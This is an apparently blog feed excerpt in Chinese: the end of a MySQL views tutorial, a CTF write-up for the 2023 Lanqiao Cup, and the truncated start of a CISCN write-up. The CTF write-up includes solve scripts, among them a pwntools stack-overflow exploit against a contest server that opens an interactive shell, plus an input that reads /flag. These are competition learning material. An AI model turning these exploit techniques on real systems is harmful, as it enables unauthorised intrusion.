updated_conditions<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>修改视图属性</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">ALTER VIEW view_name ALGORITHM &#x3D; TEMPTABLESQL SECURITY INVOKERWITH CHECK OPTION;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="9-3-删除视图">9.3. 删除视图</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 基本删除语法</span><span class="token keyword">DROP</span> <span class="token keyword">VIEW</span> <span class="token punctuation">[</span><span class="token keyword">IF</span> <span class="token keyword">EXISTS</span><span class="token punctuation">]</span> view_name<span class="token punctuation">;</span><span class="token comment">-- 同时删除多个视图</span><span class="token keyword">DROP</span> <span class="token keyword">VIEW</span> view1<span class="token punctuation">,</span> view2<span class="token punctuation">,</span> view3<span class="token punctuation">;</span><span class="token comment">-- 安全删除（视图不存在时不报错）</span><span class="token keyword">DROP</span> <span class="token keyword">VIEW</span> <span class="token keyword">IF</span> <span class="token keyword">EXISTS</span> view_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="9-4-使用视图">9.4. 使用视图</h4><p><strong>查询视图数据</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 像普通表一样查询视图</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> view_name <span class="token keyword">WHERE</span> condition<span class="token punctuation">;</span><span class="token comment">-- 查看视图结构</span><span class="token keyword">DESCRIBE</span> view_name<span class="token punctuation">;</span><span class="token keyword">DESC</span> view_name<span class="token punctuation">;</span>  <span class="token comment">-- 简写</span><span class="token comment">-- 查看视图创建语句</span><span class="token keyword">SHOW</span> <span class="token keyword">CREATE</span> <span class="token keyword">VIEW</span> view_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>通过视图更新数据</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 通过视图插入数据</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> view_name <span class="token punctuation">(</span>column1<span class="token punctuation">,</span> column2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* 限制条件：1. 视图必须基于单表2. 不能包含聚合函数、DISTINCT、GROUP BY等3. 必须包含基表中所有NOT NULL列*/</span><span class="token comment">-- 通过视图更新数据</span><span class="token keyword">UPDATE</span> view_name <span class="token keyword">SET</span> column1 <span class="token operator">=</span> new_value <span class="token keyword">WHERE</span> condition<span class="token punctuation">;</span><span class="token comment">-- 通过视图删除数据</span><span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> view_name <span class="token keyword">WHERE</span> condition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="9-5-视图管理命令">9.5. 视图管理命令</h4><p><strong>查看所有视图</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 查看当前数据库所有视图SHOW FULL TABLES WHERE TABLE_TYPE LIKE &#39;VIEW&#39;;-- 从information_schema查询视图信息SELECT * FROM information_schema.VIEWS WHERE TABLE_SCHEMA &#x3D; &#39;your_database&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>视图依赖关系查询</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 查看视图依赖的表SELECT TABLE_NAME, VIEW_DEFINITION FROM information_schema.VIEWS WHERE TABLE_SCHEMA &#x3D; &#39;your_database&#39;;-- 查看依赖于某表的所有视图SELECT * FROM information_schema.VIEWS WHERE VIEW_DEFINITION LIKE &#39;%your_table%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="9-6-高级视图技巧">9.6. 高级视图技巧</h4><p><strong>嵌套视图</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 创建基于其他视图的视图</span><span class="token keyword">CREATE</span> <span class="token keyword">VIEW</span> nested_view <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> base_view <span class="token keyword">WHERE</span> column1 <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>联合视图</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 创建合并多个查询结果的视图</span><span class="token keyword">CREATE</span> <span class="token keyword">VIEW</span> union_view <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> condition1<span class="token keyword">UNION</span> <span class="token keyword">ALL</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> table2 <span class="token keyword">WHERE</span> condition2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>聚合视图</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 创建包含聚合数据的视图</span><span class="token keyword">CREATE</span> <span class="token keyword">VIEW</span> sales_summary <span class="token keyword">AS</span><span class="token keyword">SELECT</span>     product_id<span class="token punctuation">,</span>    <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> total_orders<span class="token punctuation">,</span>    <span class="token function">SUM</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span> <span class="token keyword">AS</span> total_revenue<span class="token keyword">FROM</span> sales<span class="token keyword">GROUP</span> <span class="token keyword">BY</span> product_id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>可更新视图限制</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 检查视图是否可更新</span><span class="token keyword">SELECT</span> TABLE_NAME<span class="token punctuation">,</span> IS_UPDATABLE <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>VIEWS <span class="token keyword">WHERE</span> TABLE_SCHEMA <span class="token operator">=</span> <span class="token string">'your_database'</span><span class="token punctuation">;</span><span class="token comment">/*不可更新视图常见情况：1. 包含聚合函数2. 使用DISTINCT3. 包含GROUP BY/HAVING4. 包含UNION5. 包含子查询在某些情况下*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="9-7-视图最佳实践">9.7. 视图最佳实践</h4><ol><li><p><strong>命名规范</strong>：使用<code>v_</code>或<code>view_</code>前缀区分视图和表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">VIEW</span> v_customer_orders <span class="token keyword">AS</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>性能考虑</strong>：复杂视图可能影响查询性能</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 考虑物化视图替代方案</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> mv_sales_summary <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>安全应用</strong>：使用视图实现行列级安全</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 创建只显示部分数据的视图</span><span class="token keyword">CREATE</span> <span class="token keyword">VIEW</span> v_employee_limited <span class="token keyword">AS</span><span class="token keyword">SELECT</span> id<span class="token punctuation">,</span> name<span class="token punctuation">,</span> department <span class="token keyword">FROM</span> employees<span class="token keyword">WHERE</span> department <span class="token operator">=</span> CURRENT_USER_DEPARTMENT<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>版本控制</strong>：将视图定义纳入数据库版本管理</p></li><li><p><strong>文档注释</strong>：为视图添加注释说明</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">VIEW</span> v_monthly_sales <span class="token keyword">COMMENT</span> <span class="token string">'月度销售汇总视图'</span> <span class="token keyword">AS</span><span class="token keyword">SELECT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h4 id="9-8-视图使用示例">9.8. 视图使用示例</h4><p><strong>简化复杂查询</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">VIEW</span> v_order_details <span class="token keyword">AS</span><span class="token keyword">SELECT</span>     o<span class="token punctuation">.</span>order_id<span class="token punctuation">,</span>    o<span class="token punctuation">.</span>order_date<span class="token punctuation">,</span>    c<span class="token punctuation">.</span>customer_name<span class="token punctuation">,</span>    p<span class="token punctuation">.</span>product_name<span class="token punctuation">,</span>    od<span class="token punctuation">.</span>quantity<span class="token punctuation">,</span>    od<span class="token punctuation">.</span>unit_price<span class="token keyword">FROM</span> orders o<span class="token keyword">JOIN</span> customers c <span class="token keyword">ON</span> o<span class="token punctuation">.</span>customer_id <span class="token operator">=</span> c<span class="token punctuation">.</span>customer_id<span class="token keyword">JOIN</span> order_details od <span class="token keyword">ON</span> o<span class="token punctuation">.</span>order_id <span class="token operator">=</span> od<span class="token punctuation">.</span>order_id<span class="token keyword">JOIN</span> products p <span class="token keyword">ON</span> od<span class="token punctuation">.</span>product_id <span class="token operator">=</span> p<span class="token punctuation">.</span>product_id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>数据安全控制</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 创建仅显示公开产品的视图</span><span class="token keyword">CREATE</span> <span class="token keyword">VIEW</span> v_public_products <span class="token keyword">AS</span><span class="token keyword">SELECT</span> product_id<span class="token punctuation">,</span> product_name<span class="token punctuation">,</span> price<span class="token keyword">FROM</span> products<span class="token keyword">WHERE</span> is_public <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>报表视图</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">CREATE VIEW v_monthly_sales_report ASSELECT     YEAR(order_date) AS year,    MONTH(order_date) AS month,    COUNT(*) AS total_orders,    SUM(amount) AS total_sales,    AVG(amount) AS avg_order_valueFROM ordersGROUP BY YEAR(order_date), MONTH(order_date);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;mysql-数据库操作命令&quot;&gt;MySQL 数据库操作命令&lt;/h2&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;1-数据库操作&quot;&gt;1. 数据库操作&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;创建数据库&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;line-numbers</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://shierjinghuang.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="数据库" scheme="https://shierjinghuang.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>2023年蓝桥杯网络安全大赛</title>
    <link href="https://shierjinghuang.github.io/2023/06/09/%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://shierjinghuang.github.io/2023/06/09/%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2023-06-09T03:21:52.000Z</published>
    <updated>2025-03-27T08:03:17.157Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023年蓝桥杯网络安全大赛"><a href="#2023年蓝桥杯网络安全大赛" class="headerlink" title="2023年蓝桥杯网络安全大赛"></a>2023年蓝桥杯网络安全大赛</h1><p>[TOC]</p><h2 id="WP部分"><a href="#WP部分" class="headerlink" title="WP部分"></a>WP部分</h2><blockquote><p>怎么说呢因为蓝桥杯网络安全赛事的一些奇怪操作我没有报名，队内大佬参加并拿到了非常优秀的成绩，这是直接转的人家WP</p></blockquote><h3 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h3><h4 id="禁止访问"><a href="#禁止访问" class="headerlink" title="禁止访问"></a>禁止访问</h4><p>根据源代码提示，HackBar直接修改请求头Client-IP： </p><img src=".\蓝桥杯网络安全大赛\禁止访问.png" style="zoom: 33%;" /><h3 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h3><h4 id="ZIP"><a href="#ZIP" class="headerlink" title="ZIP"></a>ZIP</h4><p>WireShark找到flag.zip： </p><img src=".\蓝桥杯网络安全大赛\流量分析.png" style="zoom:50%;" /><p>发现需要解压密码，压缩包备注里告诉了密码的格式。使用ARCHPR破解： </p><img src=".\蓝桥杯网络安全大赛\压缩包密码爆破.png" style="zoom:50%;" /><h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><h4 id="CyberChef"><a href="#CyberChef" class="headerlink" title="CyberChef"></a>CyberChef</h4><p>到Cyberchef，先ROT13（好像就是凯撒密码，解密时Amount需要调整），然后解Base64：</p><p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CCyberChef.png"></p><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>RSA共模攻击：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from Crypto.Util.number import *import gmpy2import randomrandom.seed(123456)e1 &#x3D; random.randint(100000000, 999999999)e2 &#x3D; 65537n &#x3D;7265521127830448713067411832186939510560957540642195787738901620268897564963900603849624938868472135068795683478994264434459545615489055678687748127470957m1 &#x3D;3315026215410356401822612597933850774333471554653501609476726308255829187036771889305156951657972976515685121382853979526632479380900600042319433533497363m2 &#x3D;1188105647021006315444157379624581671965264301631019818847700108837497109352704297426176854648450245702004723738154094931880004264638539450721642553435120gcd, s, t &#x3D; gmpy2.gcdext(e1, e2)if s &lt; 0:s &#x3D; -sm1 &#x3D; gmpy2.invert(m1, n)if t &lt; 0:t &#x3D; -tm2 &#x3D; gmpy2.invert(m2, n)m1 &#x3D; gmpy2.powmod(m1, s, n)m2 &#x3D; gmpy2.powmod(m2, t, n)m &#x3D; m1 * m2 % nflag &#x3D; long_to_bytes(m)print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><h4 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h4><p>直接IDA动态调试，在main函数return时，可以看到原来变量v5的内容经过RC4被改成了flag： </p><p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CRC4.png"></p><h4 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h4><p>程序将明文和key进行异或，我们直接将密文再异或一次就得到flag。 </p><p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CXOR.png"></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token string">'SEcRET7'</span>enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span><span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> enc<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞挖掘分析"><a href="#漏洞挖掘分析" class="headerlink" title="漏洞挖掘分析"></a>漏洞挖掘分析</h3><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>gets函数栈溢出漏洞，直接修改返回地址为后门函数即可： </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># p = process('./pwn')</span><span class="token comment"># libc = ELF('../../glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.200.77.68'</span><span class="token punctuation">,</span> <span class="token string">'12451'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF('./libc-2.27.so')</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>se <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> num <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>num<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> delims <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>info <span class="token operator">=</span> <span class="token keyword">lambda</span> tag<span class="token punctuation">,</span> addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>tag <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x4011B1</span>payload <span class="token operator">=</span> <span class="token string">b'B'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ia<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="杂谈："><a href="#杂谈：" class="headerlink" title="杂谈："></a>杂谈：</h2><blockquote><p>以下为个人观点</p></blockquote><p>今年的蓝桥杯可以说是破事一堆，作为网安这边第一个交钱比赛的赛事，第一个双机位监考同时设有监考老师，禁止查外网，甚至禁止pip的比赛，今年的蓝桥杯网安都有开创性的意义</p><p>如果我没记错的话，第一次定的时间是5月27-28，然后果不其然跟CISCN撞了，之后改时间啥啥的作为一个看乐子的人倒是看了个尽兴，同时今年一些高校，在与蓝桥杯合作的高校在没有接触过CTF的同学们中宣传本届蓝桥杯网络安全大赛…….</p><p>最后的结果已经是省赛能做一道题就能稳定三等奖了，团队中全栈大佬甚至在比赛中短暂登顶初赛第一，最后前五十，因为蓝桥杯在算法那边的名声在外还真有一些没接触过CTF的兄弟报名了蓝桥杯网络安全大赛，最后0解饮恨</p><p>只能说不好评价也不想评价，蓝桥杯赛事主办方你开心就好</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023年蓝桥杯网络安全大赛&quot;&gt;&lt;a href=&quot;#2023年蓝桥杯网络安全大赛&quot; class=&quot;headerlink&quot; title=&quot;2023年蓝桥杯网络安全大赛&quot;&gt;&lt;/a&gt;2023年蓝桥杯网络安全大赛&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;WP部分</summary>
      
    
    
    
    <category term="CTF" scheme="https://shierjinghuang.github.io/categories/CTF/"/>
    
    
    <category term="蓝桥杯" scheme="https://shierjinghuang.github.io/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/"/>
    
    <category term="CTF" scheme="https://shierjinghuang.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2023年ciscn题解</title>
    <link href="https://shierjinghuang.github.io/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/"/>
    <id>https://shierjinghuang.github.io/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/</id>
    <published>2023-05-27T11:56:52.000Z</published>
    <updated>2023-05-30T06:43:57.505Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DebuGGerrr-战队WRITEUP"><a href="#DebuGGerrr-战队WRITEUP" class="headerlink" title="DebuGGerrr 战队WRITEUP"></a>DebuGGerrr 战队WRITEUP</h1><h2 id="一、战队信息"><a href="#一、战队信息" class="headerlink" title="一、战队信息"></a>一、战队信息</h2><p>战队名称： DebuGGerrr </p><p>战队排名：261</p><h2 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a>二、解题情况</h2><p> <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528173741.png">  </p><p>[TOC]</p><h2 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h2><h3 id="杂项："><a href="#杂项：" class="headerlink" title="杂项："></a>杂项：</h3><h4 id="签到卡："><a href="#签到卡：" class="headerlink" title="签到卡："></a>签到卡：</h4><p> 随便输入得到hint，关注公众号，得到他的提示，输入 print(open(‘/flag’).read())得到flag</p><h4 id="国粹："><a href="#国粹：" class="headerlink" title="国粹："></a>国粹：</h4><p>在最初的思路里是一位题目是一个形如E(x)=(ax+b)(modm)的类仿射密码</p><p>后面试着要不把这些画出来看下，在写了几串之后看到了flag….然后因为分工，两个人写点坐标的格式不一样，最终Python代码如下…..</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token comment">#读入文件</span>file_path <span class="token operator">=</span> <span class="token string">"data.txt"</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_table<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> header<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment">#定义 x  y变量</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#定义颜色变量</span>color <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">]</span>xx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token 